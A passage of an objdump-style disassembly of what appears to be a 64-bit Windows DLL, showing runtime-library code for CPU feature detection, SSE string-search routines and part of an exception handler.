   180004a4e:	56                   	push   %rsi
   180004a4f:	57                   	push   %rdi
   180004a50:	41 56                	push   %r14
   180004a52:	48 83 ec 10          	sub    $0x10,%rsp
   180004a56:	33 c9                	xor    %ecx,%ecx
   180004a58:	c7 05 ba a5 01 00 02 	movl   $0x2,0x1a5ba(%rip)        # 0x18001f01c
   180004a5f:	00 00 00 
   180004a62:	33 c0                	xor    %eax,%eax
   180004a64:	c7 05 aa a5 01 00 01 	movl   $0x1,0x1a5aa(%rip)        # 0x18001f018
   180004a6b:	00 00 00 
   180004a6e:	0f a2                	cpuid
   180004a70:	44 8b c9             	mov    %ecx,%r9d
   180004a73:	44 8b d2             	mov    %edx,%r10d
   180004a76:	81 f1 63 41 4d 44    	xor    $0x444d4163,%ecx
   180004a7c:	81 f2 65 6e 74 69    	xor    $0x69746e65,%edx
   180004a82:	8b eb                	mov    %ebx,%ebp
   180004a84:	45 33 db             	xor    %r11d,%r11d
   180004a87:	81 f5 41 75 74 68    	xor    $0x68747541,%ebp
   180004a8d:	44 8b c3             	mov    %ebx,%r8d
   180004a90:	0b ea                	or     %edx,%ebp
   180004a92:	44 8b f0             	mov    %eax,%r14d
   180004a95:	0b e9                	or     %ecx,%ebp
   180004a97:	41 81 f1 6e 74 65 6c 	xor    $0x6c65746e,%r9d
   180004a9e:	41 81 f0 47 65 6e 75 	xor    $0x756e6547,%r8d
   180004aa5:	41 8d 43 01          	lea    0x1(%r11),%eax
   180004aa9:	33 c9                	xor    %ecx,%ecx
   180004aab:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   180004ab2:	0f a2                	cpuid
   180004ab4:	45 0b c8             	or     %r8d,%r9d
   180004ab7:	89 04 24             	mov    %eax,(%rsp)
   180004aba:	45 0b ca             	or     %r10d,%r9d
   180004abd:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180004ac1:	8b f1                	mov    %ecx,%esi
   180004ac3:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180004ac7:	8b f8                	mov    %eax,%edi
   180004ac9:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   180004acd:	75 50                	jne    0x180004b1f
   180004acf:	48 83 0d 49 a5 01 00 	orq    $0xffffffffffffffff,0x1a549(%rip)        # 0x18001f020
   180004ad6:	ff 
   180004ad7:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180004adc:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180004ae1:	74 28                	je     0x180004b0b
   180004ae3:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180004ae8:	74 21                	je     0x180004b0b
   180004aea:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180004aef:	74 1a                	je     0x180004b0b
   180004af1:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180004af6:	83 f8 20             	cmp    $0x20,%eax
   180004af9:	77 24                	ja     0x180004b1f
   180004afb:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180004b02:	00 00 00 
   180004b05:	48 0f a3 c1          	bt     %rax,%rcx
   180004b09:	73 14                	jae    0x180004b1f
   180004b0b:	44 8b 05 4e be 01 00 	mov    0x1be4e(%rip),%r8d        # 0x180020960
   180004b12:	41 83 c8 01          	or     $0x1,%r8d
   180004b16:	44 89 05 43 be 01 00 	mov    %r8d,0x1be43(%rip)        # 0x180020960
   180004b1d:	eb 07                	jmp    0x180004b26
   180004b1f:	44 8b 05 3a be 01 00 	mov    0x1be3a(%rip),%r8d        # 0x180020960
   180004b26:	85 ed                	test   %ebp,%ebp
   180004b28:	75 19                	jne    0x180004b43
   180004b2a:	81 e7 00 0f f0 0f    	and    $0xff00f00,%edi
   180004b30:	81 ff 00 11 60 00    	cmp    $0x601100,%edi
   180004b36:	72 0b                	jb     0x180004b43
   180004b38:	41 83 c8 04          	or     $0x4,%r8d
   180004b3c:	44 89 05 1d be 01 00 	mov    %r8d,0x1be1d(%rip)        # 0x180020960
   180004b43:	b8 07 00 00 00       	mov    $0x7,%eax
   180004b48:	44 3b f0             	cmp    %eax,%r14d
   180004b4b:	7c 27                	jl     0x180004b74
   180004b4d:	33 c9                	xor    %ecx,%ecx
   180004b4f:	0f a2                	cpuid
   180004b51:	89 04 24             	mov    %eax,(%rsp)
   180004b54:	44 8b db             	mov    %ebx,%r11d
   180004b57:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180004b5b:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180004b5f:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   180004b63:	0f ba e3 09          	bt     $0x9,%ebx
   180004b67:	73 0b                	jae    0x180004b74
   180004b69:	41 83 c8 02          	or     $0x2,%r8d
   180004b6d:	44 89 05 ec bd 01 00 	mov    %r8d,0x1bdec(%rip)        # 0x180020960
   180004b74:	0f ba e6 14          	bt     $0x14,%esi
   180004b78:	73 6e                	jae    0x180004be8
   180004b7a:	c7 05 94 a4 01 00 02 	movl   $0x2,0x1a494(%rip)        # 0x18001f018
   180004b81:	00 00 00 
   180004b84:	c7 05 8e a4 01 00 06 	movl   $0x6,0x1a48e(%rip)        # 0x18001f01c
   180004b8b:	00 00 00 
   180004b8e:	0f ba e6 1b          	bt     $0x1b,%esi
   180004b92:	73 54                	jae    0x180004be8
   180004b94:	0f ba e6 1c          	bt     $0x1c,%esi
   180004b98:	73 4e                	jae    0x180004be8
   180004b9a:	33 c9                	xor    %ecx,%ecx
   180004b9c:	0f 01 d0             	xgetbv
   180004b9f:	48 c1 e2 20          	shl    $0x20,%rdx
   180004ba3:	48 0b d0             	or     %rax,%rdx
   180004ba6:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   180004bab:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180004bb0:	24 06                	and    $0x6,%al
   180004bb2:	3c 06                	cmp    $0x6,%al
   180004bb4:	75 32                	jne    0x180004be8
   180004bb6:	8b 05 60 a4 01 00    	mov    0x1a460(%rip),%eax        # 0x18001f01c
   180004bbc:	83 c8 08             	or     $0x8,%eax
   180004bbf:	c7 05 4f a4 01 00 03 	movl   $0x3,0x1a44f(%rip)        # 0x18001f018
   180004bc6:	00 00 00 
   180004bc9:	89 05 4d a4 01 00    	mov    %eax,0x1a44d(%rip)        # 0x18001f01c
   180004bcf:	41 f6 c3 20          	test   $0x20,%r11b
   180004bd3:	74 13                	je     0x180004be8
   180004bd5:	83 c8 20             	or     $0x20,%eax
   180004bd8:	c7 05 36 a4 01 00 05 	movl   $0x5,0x1a436(%rip)        # 0x18001f018
   180004bdf:	00 00 00 
   180004be2:	89 05 34 a4 01 00    	mov    %eax,0x1a434(%rip)        # 0x18001f01c
   180004be8:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180004bed:	33 c0                	xor    %eax,%eax
   180004bef:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   180004bf4:	48 83 c4 10          	add    $0x10,%rsp
   180004bf8:	41 5e                	pop    %r14
   180004bfa:	5f                   	pop    %rdi
   180004bfb:	5e                   	pop    %rsi
   180004bfc:	c3                   	ret
   180004bfd:	cc                   	int3
   180004bfe:	cc                   	int3
   180004bff:	cc                   	int3
   180004c00:	b8 01 00 00 00       	mov    $0x1,%eax
   180004c05:	c3                   	ret
   180004c06:	cc                   	int3
   180004c07:	cc                   	int3
   180004c08:	33 c0                	xor    %eax,%eax
   180004c0a:	39 05 20 c9 01 00    	cmp    %eax,0x1c920(%rip)        # 0x180021530
   180004c10:	0f 95 c0             	setne  %al
   180004c13:	c3                   	ret
   180004c14:	c2 00 00             	ret    $0x0
   180004c17:	cc                   	int3
   180004c18:	e9 33 00 00 00       	jmp    0x180004c50
   180004c1d:	cc                   	int3
   180004c1e:	cc                   	int3
   180004c1f:	cc                   	int3
   180004c20:	40 53                	rex push %rbx
   180004c22:	48 83 ec 20          	sub    $0x20,%rsp
   180004c26:	48 8d 05 bb f8 00 00 	lea    0xf8bb(%rip),%rax        # 0x1800144e8
   180004c2d:	48 8b d9             	mov    %rcx,%rbx
   180004c30:	48 89 01             	mov    %rax,(%rcx)
   180004c33:	f6 c2 01             	test   $0x1,%dl
   180004c36:	74 0a                	je     0x180004c42
   180004c38:	ba 18 00 00 00       	mov    $0x18,%edx
   180004c3d:	e8 d6 ff ff ff       	call   0x180004c18
   180004c42:	48 8b c3             	mov    %rbx,%rax
   180004c45:	48 83 c4 20          	add    $0x20,%rsp
   180004c49:	5b                   	pop    %rbx
   180004c4a:	c3                   	ret
   180004c4b:	cc                   	int3
   180004c4c:	cc                   	int3
   180004c4d:	cc                   	int3
   180004c4e:	cc                   	int3
   180004c4f:	cc                   	int3
   180004c50:	e9 eb 29 00 00       	jmp    0x180007640
   180004c55:	cc                   	int3
   180004c56:	cc                   	int3
   180004c57:	cc                   	int3
   180004c58:	48 83 ec 18          	sub    $0x18,%rsp
   180004c5c:	0f b6 c2             	movzbl %dl,%eax
   180004c5f:	4c 8b c1             	mov    %rcx,%r8
   180004c62:	44 8b d0             	mov    %eax,%r10d
   180004c65:	49 83 e0 f0          	and    $0xfffffffffffffff0,%r8
   180004c69:	41 c1 e2 08          	shl    $0x8,%r10d
   180004c6d:	83 e1 0f             	and    $0xf,%ecx
   180004c70:	44 0b d0             	or     %eax,%r10d
   180004c73:	45 33 c9             	xor    %r9d,%r9d
   180004c76:	83 c8 ff             	or     $0xffffffff,%eax
   180004c79:	0f 57 d2             	xorps  %xmm2,%xmm2
   180004c7c:	d3 e0                	shl    %cl,%eax
   180004c7e:	66 41 0f 6e c2       	movd   %r10d,%xmm0
   180004c83:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   180004c88:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004c8b:	66 41 0f 74 00       	pcmpeqb (%r8),%xmm0
   180004c90:	66 0f 70 d9 00       	pshufd $0x0,%xmm1,%xmm3
   180004c95:	66 0f 6f cb          	movdqa %xmm3,%xmm1
   180004c99:	66 41 0f 74 08       	pcmpeqb (%r8),%xmm1
   180004c9e:	66 0f eb c8          	por    %xmm0,%xmm1
   180004ca2:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   180004ca6:	23 d0                	and    %eax,%edx
   180004ca8:	75 22                	jne    0x180004ccc
   180004caa:	49 83 c0 10          	add    $0x10,%r8
   180004cae:	66 0f 6f cb          	movdqa %xmm3,%xmm1
   180004cb2:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   180004cb6:	66 41 0f 74 08       	pcmpeqb (%r8),%xmm1
   180004cbb:	66 41 0f 74 00       	pcmpeqb (%r8),%xmm0
   180004cc0:	66 0f eb c8          	por    %xmm0,%xmm1
   180004cc4:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   180004cc8:	85 d2                	test   %edx,%edx
   180004cca:	74 de                	je     0x180004caa
   180004ccc:	0f bc d2             	bsf    %edx,%edx
   180004ccf:	49 03 d0             	add    %r8,%rdx
   180004cd2:	44 38 12             	cmp    %r10b,(%rdx)
   180004cd5:	4c 0f 44 ca          	cmove  %rdx,%r9
   180004cd9:	49 8b c1             	mov    %r9,%rax
   180004cdc:	48 83 c4 18          	add    $0x18,%rsp
   180004ce0:	c3                   	ret
   180004ce1:	cc                   	int3
   180004ce2:	cc                   	int3
   180004ce3:	cc                   	int3
   180004ce4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004ce9:	57                   	push   %rdi
   180004cea:	48 83 ec 10          	sub    $0x10,%rsp
   180004cee:	40 8a 3a             	mov    (%rdx),%dil
   180004cf1:	48 8b da             	mov    %rdx,%rbx
   180004cf4:	4c 8b c1             	mov    %rcx,%r8
   180004cf7:	40 84 ff             	test   %dil,%dil
   180004cfa:	75 08                	jne    0x180004d04
   180004cfc:	48 8b c1             	mov    %rcx,%rax
   180004cff:	e9 b5 01 00 00       	jmp    0x180004eb9
   180004d04:	83 3d 0d a3 01 00 02 	cmpl   $0x2,0x1a30d(%rip)        # 0x18001f018
   180004d0b:	41 ba ff 0f 00 00    	mov    $0xfff,%r10d
   180004d11:	45 8d 5a f1          	lea    -0xf(%r10),%r11d
   180004d15:	0f 8d d0 00 00 00    	jge    0x180004deb
   180004d1b:	40 0f b6 c7          	movzbl %dil,%eax
   180004d1f:	0f 57 d2             	xorps  %xmm2,%xmm2
   180004d22:	8b c8                	mov    %eax,%ecx
   180004d24:	c1 e1 08             	shl    $0x8,%ecx
   180004d27:	0b c8                	or     %eax,%ecx
   180004d29:	66 0f 6e c1          	movd   %ecx,%xmm0
   180004d2d:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   180004d32:	66 0f 70 d9 00       	pshufd $0x0,%xmm1,%xmm3
   180004d37:	49 8b c0             	mov    %r8,%rax
   180004d3a:	49 23 c2             	and    %r10,%rax
   180004d3d:	49 3b c3             	cmp    %r11,%rax
   180004d40:	77 29                	ja     0x180004d6b
   180004d42:	f3 41 0f 6f 00       	movdqu (%r8),%xmm0
   180004d47:	66 0f 6f c8          	movdqa %xmm0,%xmm1
   180004d4b:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   180004d4f:	66 0f 74 ca          	pcmpeqb %xmm2,%xmm1
   180004d53:	66 0f eb c8          	por    %xmm0,%xmm1
   180004d57:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   180004d5b:	85 c0                	test   %eax,%eax
   180004d5d:	75 06                	jne    0x180004d65
   180004d5f:	49 83 c0 10          	add    $0x10,%r8
   180004d63:	eb d2                	jmp    0x180004d37
   180004d65:	0f bc c0             	bsf    %eax,%eax
   180004d68:	4c 03 c0             	add    %rax,%r8
   180004d6b:	41 80 38 00          	cmpb   $0x0,(%r8)
   180004d6f:	0f 84 42 01 00 00    	je     0x180004eb7
   180004d75:	41 3a 38             	cmp    (%r8),%dil
   180004d78:	75 69                	jne    0x180004de3
   180004d7a:	49 8b d0             	mov    %r8,%rdx
   180004d7d:	4c 8b cb             	mov    %rbx,%r9
   180004d80:	49 8b c1             	mov    %r9,%rax
   180004d83:	49 23 c2             	and    %r10,%rax
   180004d86:	49 3b c3             	cmp    %r11,%rax
   180004d89:	77 41                	ja     0x180004dcc
   180004d8b:	48 8b c2             	mov    %rdx,%rax
   180004d8e:	49 23 c2             	and    %r10,%rax
   180004d91:	49 3b c3             	cmp    %r11,%rax
   180004d94:	77 36                	ja     0x180004dcc
   180004d96:	f3 41 0f 6f 09       	movdqu (%r9),%xmm1
   180004d9b:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   180004d9f:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   180004da3:	66 0f 74 ca          	pcmpeqb %xmm2,%xmm1
   180004da7:	66 0f 74 c2          	pcmpeqb %xmm2,%xmm0
   180004dab:	66 0f eb c1          	por    %xmm1,%xmm0
   180004daf:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   180004db3:	85 c0                	test   %eax,%eax
   180004db5:	75 0a                	jne    0x180004dc1
   180004db7:	48 83 c2 10          	add    $0x10,%rdx
   180004dbb:	49 83 c1 10          	add    $0x10,%r9
   180004dbf:	eb bf                	jmp    0x180004d80
   180004dc1:	0f bc c0             	bsf    %eax,%eax
   180004dc4:	8b c8                	mov    %eax,%ecx
   180004dc6:	48 03 d1             	add    %rcx,%rdx
   180004dc9:	4c 03 c9             	add    %rcx,%r9
   180004dcc:	41 8a 01             	mov    (%r9),%al
   180004dcf:	84 c0                	test   %al,%al
   180004dd1:	0f 84 db 00 00 00    	je     0x180004eb2
   180004dd7:	38 02                	cmp    %al,(%rdx)
   180004dd9:	75 08                	jne    0x180004de3
   180004ddb:	48 ff c2             	inc    %rdx
   180004dde:	49 ff c1             	inc    %r9
   180004de1:	eb 9d                	jmp    0x180004d80
   180004de3:	49 ff c0             	inc    %r8
   180004de6:	e9 4c ff ff ff       	jmp    0x180004d37
   180004deb:	48 8b c3             	mov    %rbx,%rax
   180004dee:	49 23 c2             	and    %r10,%rax
   180004df1:	49 3b c3             	cmp    %r11,%rax
   180004df4:	77 06                	ja     0x180004dfc
   180004df6:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   180004dfa:	eb 2c                	jmp    0x180004e28
   180004dfc:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004dff:	48 8b cb             	mov    %rbx,%rcx
   180004e02:	40 8a d7             	mov    %dil,%dl
   180004e05:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   180004e0b:	0f be c2             	movsbl %dl,%eax
   180004e0e:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180004e13:	66 0f 3a 20 c0 0f    	pinsrb $0xf,%eax,%xmm0
   180004e19:	84 d2                	test   %dl,%dl
   180004e1b:	74 05                	je     0x180004e22
   180004e1d:	48 ff c1             	inc    %rcx
   180004e20:	8a 11                	mov    (%rcx),%dl
   180004e22:	49 83 e9 01          	sub    $0x1,%r9
   180004e26:	75 e3                	jne    0x180004e0b
   180004e28:	49 8b c0             	mov    %r8,%rax
   180004e2b:	49 23 c2             	and    %r10,%rax
   180004e2e:	49 3b c3             	cmp    %r11,%rax
   180004e31:	77 57                	ja     0x180004e8a
   180004e33:	f3 41 0f 6f 08       	movdqu (%r8),%xmm1
   180004e38:	66 0f 3a 63 c1 0c    	pcmpistri $0xc,%xmm1,%xmm0
   180004e3e:	76 06                	jbe    0x180004e46
   180004e40:	49 83 c0 10          	add    $0x10,%r8
   180004e44:	eb e2                	jmp    0x180004e28
   180004e46:	73 6f                	jae    0x180004eb7
   180004e48:	66 0f 3a 63 c1 0c    	pcmpistri $0xc,%xmm1,%xmm0
   180004e4e:	48 63 c1             	movslq %ecx,%rax
   180004e51:	4c 03 c0             	add    %rax,%r8
   180004e54:	49 8b d0             	mov    %r8,%rdx
   180004e57:	4c 8b cb             	mov    %rbx,%r9
   180004e5a:	48 8b c2             	mov    %rdx,%rax
   180004e5d:	49 23 c2             	and    %r10,%rax
   180004e60:	49 3b c3             	cmp    %r11,%rax
   180004e63:	77 35                	ja     0x180004e9a
   180004e65:	49 8b c1             	mov    %r9,%rax
   180004e68:	49 23 c2             	and    %r10,%rax
   180004e6b:	49 3b c3             	cmp    %r11,%rax
   180004e6e:	77 2a                	ja     0x180004e9a
   180004e70:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   180004e74:	f3 41 0f 6f 11       	movdqu (%r9),%xmm2
   180004e79:	66 0f 3a 63 d1 0c    	pcmpistri $0xc,%xmm1,%xmm2
   180004e7f:	71 14                	jno    0x180004e95
   180004e81:	78 2f                	js     0x180004eb2
   180004e83:	b8 10 00 00 00       	mov    $0x10,%eax
   180004e88:	eb 20                	jmp    0x180004eaa
   180004e8a:	41 80 38 00          	cmpb   $0x0,(%r8)
   180004e8e:	74 27                	je     0x180004eb7
   180004e90:	41 38 38             	cmp    %dil,(%r8)
   180004e93:	74 bf                	je     0x180004e54
   180004e95:	49 ff c0             	inc    %r8
   180004e98:	eb 8e                	jmp    0x180004e28
   180004e9a:	41 8a 01             	mov    (%r9),%al
   180004e9d:	84 c0                	test   %al,%al
   180004e9f:	74 11                	je     0x180004eb2
   180004ea1:	38 02                	cmp    %al,(%rdx)
   180004ea3:	75 f0                	jne    0x180004e95
   180004ea5:	b8 01 00 00 00       	mov    $0x1,%eax
   180004eaa:	48 03 d0             	add    %rax,%rdx
   180004ead:	4c 03 c8             	add    %rax,%r9
   180004eb0:	eb a8                	jmp    0x180004e5a
   180004eb2:	49 8b c0             	mov    %r8,%rax
   180004eb5:	eb 02                	jmp    0x180004eb9
   180004eb7:	33 c0                	xor    %eax,%eax
   180004eb9:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180004ebe:	48 83 c4 10          	add    $0x10,%rsp
   180004ec2:	5f                   	pop    %rdi
   180004ec3:	c3                   	ret
   180004ec4:	48 83 ec 18          	sub    $0x18,%rsp
   180004ec8:	45 33 c0             	xor    %r8d,%r8d
   180004ecb:	4c 8b c9             	mov    %rcx,%r9
   180004ece:	85 d2                	test   %edx,%edx
   180004ed0:	75 48                	jne    0x180004f1a
   180004ed2:	41 83 e1 0f          	and    $0xf,%r9d
   180004ed6:	48 8b d1             	mov    %rcx,%rdx
   180004ed9:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   180004edd:	41 8b c9             	mov    %r9d,%ecx
   180004ee0:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180004ee4:	0f 57 c9             	xorps  %xmm1,%xmm1
   180004ee7:	41 d3 e1             	shl    %cl,%r9d
   180004eea:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   180004eee:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   180004ef2:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   180004ef6:	41 23 c1             	and    %r9d,%eax
   180004ef9:	75 14                	jne    0x180004f0f
   180004efb:	48 83 c2 10          	add    $0x10,%rdx
   180004eff:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   180004f03:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   180004f07:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   180004f0b:	85 c0                	test   %eax,%eax
   180004f0d:	74 ec                	je     0x180004efb
   180004f0f:	0f bc c0             	bsf    %eax,%eax
   180004f12:	48 03 c2             	add    %rdx,%rax
   180004f15:	e9 a5 00 00 00       	jmp    0x180004fbf
   180004f1a:	83 3d f7 a0 01 00 02 	cmpl   $0x2,0x1a0f7(%rip)        # 0x18001f018
   180004f21:	0f 8d b0 00 00 00    	jge    0x180004fd7
   180004f27:	0f b6 c2             	movzbl %dl,%eax
   180004f2a:	4d 8b d1             	mov    %r9,%r10
   180004f2d:	41 83 e1 0f          	and    $0xf,%r9d
   180004f31:	49 83 e2 f0          	and    $0xfffffffffffffff0,%r10
   180004f35:	8b c8                	mov    %eax,%ecx
   180004f37:	0f 57 d2             	xorps  %xmm2,%xmm2
   180004f3a:	c1 e1 08             	shl    $0x8,%ecx
   180004f3d:	0b c8                	or     %eax,%ecx
   180004f3f:	66 0f 6e c1          	movd   %ecx,%xmm0
   180004f43:	41 8b c9             	mov    %r9d,%ecx
   180004f46:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   180004f4b:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180004f4f:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004f52:	41 d3 e1             	shl    %cl,%r9d
   180004f55:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   180004f5a:	66 0f d7 c8          	pmovmskb %xmm0,%ecx
   180004f5e:	66 0f 70 d9 00       	pshufd $0x0,%xmm1,%xmm3
   180004f63:	66 0f 6f c3          	movdqa %xmm3,%xmm0
   180004f67:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   180004f6c:	66 0f d7 d0          	pmovmskb %xmm0,%edx
   180004f70:	41 23 d1             	and    %r9d,%edx
   180004f73:	41 23 c9             	and    %r9d,%ecx
   180004f76:	75 2e                	jne    0x180004fa6
   180004f78:	0f bd ca             	bsr    %edx,%ecx
   180004f7b:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   180004f7f:	66 0f 6f c3          	movdqa %xmm3,%xmm0
   180004f83:	49 03 ca             	add    %r10,%rcx
   180004f86:	85 d2                	test   %edx,%edx
   180004f88:	4c 0f 45 c1          	cmovne %rcx,%r8
   180004f8c:	49 83 c2 10          	add    $0x10,%r10
   180004f90:	66 41 0f 74 0a       	pcmpeqb (%r10),%xmm1
   180004f95:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   180004f9a:	66 0f d7 c9          	pmovmskb %xmm1,%ecx
   180004f9e:	66 0f d7 d0          	pmovmskb %xmm0,%edx
   180004fa2:	85 c9                	test   %ecx,%ecx
   180004fa4:	74 d2                	je     0x180004f78
   180004fa6:	8b c1                	mov    %ecx,%eax
   180004fa8:	f7 d8                	neg    %eax
   180004faa:	23 c1                	and    %ecx,%eax
   180004fac:	ff c8                	dec    %eax
   180004fae:	23 d0                	and    %eax,%edx
   180004fb0:	0f bd ca             	bsr    %edx,%ecx
   180004fb3:	49 03 ca             	add    %r10,%rcx
   180004fb6:	85 d2                	test   %edx,%edx
   180004fb8:	4c 0f 45 c1          	cmovne %rcx,%r8
   180004fbc:	49 8b c0             	mov    %r8,%rax
   180004fbf:	48 83 c4 18          	add    $0x18,%rsp
   180004fc3:	c3                   	ret
   180004fc4:	41 0f be 01          	movsbl (%r9),%eax
   180004fc8:	3b c2                	cmp    %edx,%eax
   180004fca:	4d 0f 44 c1          	cmove  %r9,%r8
   180004fce:	41 80 39 00          	cmpb   $0x0,(%r9)
   180004fd2:	74 e8                	je     0x180004fbc
   180004fd4:	49 ff c1             	inc    %r9
   180004fd7:	41 f6 c1 0f          	test   $0xf,%r9b
   180004fdb:	75 e7                	jne    0x180004fc4
   180004fdd:	0f b6 c2             	movzbl %dl,%eax
   180004fe0:	66 0f 6e c0          	movd   %eax,%xmm0
   180004fe4:	66 41 0f 3a 63 01 40 	pcmpistri $0x40,(%r9),%xmm0
   180004feb:	73 0d                	jae    0x180004ffa
   180004fed:	4c 63 c1             	movslq %ecx,%r8
   180004ff0:	4d 03 c1             	add    %r9,%r8
   180004ff3:	66 41 0f 3a 63 01 40 	pcmpistri $0x40,(%r9),%xmm0
   180004ffa:	74 c0                	je     0x180004fbc
   180004ffc:	49 83 c1 10          	add    $0x10,%r9
   180005000:	eb e2                	jmp    0x180004fe4
   180005002:	cc                   	int3
   180005003:	cc                   	int3
   180005004:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005009:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000500e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180005013:	57                   	push   %rdi
   180005014:	41 54                	push   %r12
   180005016:	41 55                	push   %r13
   180005018:	41 56                	push   %r14
   18000501a:	41 57                	push   %r15
   18000501c:	48 83 ec 40          	sub    $0x40,%rsp
   180005020:	48 8b e9             	mov    %rcx,%rbp
   180005023:	4d 8b f1             	mov    %r9,%r14
   180005026:	49 8b c8             	mov    %r8,%rcx
   180005029:	49 8b f8             	mov    %r8,%rdi
   18000502c:	4c 8b ea             	mov    %rdx,%r13
   18000502f:	e8 50 06 00 00       	call   0x180005684
   180005034:	4d 8b 66 08          	mov    0x8(%r14),%r12
   180005038:	4d 8b 3e             	mov    (%r14),%r15
   18000503b:	49 8b 5e 38          	mov    0x38(%r14),%rbx
   18000503f:	4d 2b fc             	sub    %r12,%r15
   180005042:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   180005046:	0f 85 e0 00 00 00    	jne    0x18000512c
   18000504c:	41 8b 76 48          	mov    0x48(%r14),%esi
   180005050:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   180005055:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   18000505a:	3b 33                	cmp    (%rbx),%esi
   18000505c:	0f 83 7a 01 00 00    	jae    0x1800051dc
   180005062:	8b fe                	mov    %esi,%edi
   180005064:	48 03 ff             	add    %rdi,%rdi
   180005067:	8b 44 fb 04          	mov    0x4(%rbx,%rdi,8),%eax
   18000506b:	4c 3b f8             	cmp    %rax,%r15
   18000506e:	0f 82 aa 00 00 00    	jb     0x18000511e
   180005074:	8b 44 fb 08          	mov    0x8(%rbx,%rdi,8),%eax
   180005078:	4c 3b f8             	cmp    %rax,%r15
   18000507b:	0f 83 9d 00 00 00    	jae    0x18000511e
   180005081:	83 7c fb 10 00       	cmpl   $0x0,0x10(%rbx,%rdi,8)
   180005086:	0f 84 92 00 00 00    	je     0x18000511e
   18000508c:	83 7c fb 0c 01       	cmpl   $0x1,0xc(%rbx,%rdi,8)
   180005091:	74 17                	je     0x1800050aa
   180005093:	8b 44 fb 0c          	mov    0xc(%rbx,%rdi,8),%eax
   180005097:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000509c:	49 03 c4             	add    %r12,%rax
   18000509f:	49 8b d5             	mov    %r13,%rdx
   1800050a2:	ff d0                	call   *%rax
   1800050a4:	85 c0                	test   %eax,%eax
   1800050a6:	78 7d                	js     0x180005125
   1800050a8:	7e 74                	jle    0x18000511e
   1800050aa:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   1800050b1:	75 28                	jne    0x1800050db
   1800050b3:	48 83 3d 85 c4 01 00 	cmpq   $0x0,0x1c485(%rip)        # 0x180021540
   1800050ba:	00 
   1800050bb:	74 1e                	je     0x1800050db
   1800050bd:	48 8d 0d 7c c4 01 00 	lea    0x1c47c(%rip),%rcx        # 0x180021540
   1800050c4:	e8 f7 d4 00 00       	call   0x1800125c0
   1800050c9:	85 c0                	test   %eax,%eax
   1800050cb:	74 0e                	je     0x1800050db
   1800050cd:	ba 01 00 00 00       	mov    $0x1,%edx
   1800050d2:	48 8b cd             	mov    %rbp,%rcx
   1800050d5:	ff 15 65 c4 01 00    	call   *0x1c465(%rip)        # 0x180021540
   1800050db:	8b 4c fb 10          	mov    0x10(%rbx,%rdi,8),%ecx
   1800050df:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1800050e5:	49 03 cc             	add    %r12,%rcx
   1800050e8:	49 8b d5             	mov    %r13,%rdx
   1800050eb:	e8 60 05 00 00       	call   0x180005650
   1800050f0:	49 8b 46 40          	mov    0x40(%r14),%rax
   1800050f4:	4c 8b c5             	mov    %rbp,%r8
   1800050f7:	8b 54 fb 10          	mov    0x10(%rbx,%rdi,8),%edx
   1800050fb:	49 8b cd             	mov    %r13,%rcx
   1800050fe:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   180005102:	49 03 d4             	add    %r12,%rdx
   180005105:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000510a:	49 8b 46 28          	mov    0x28(%r14),%rax
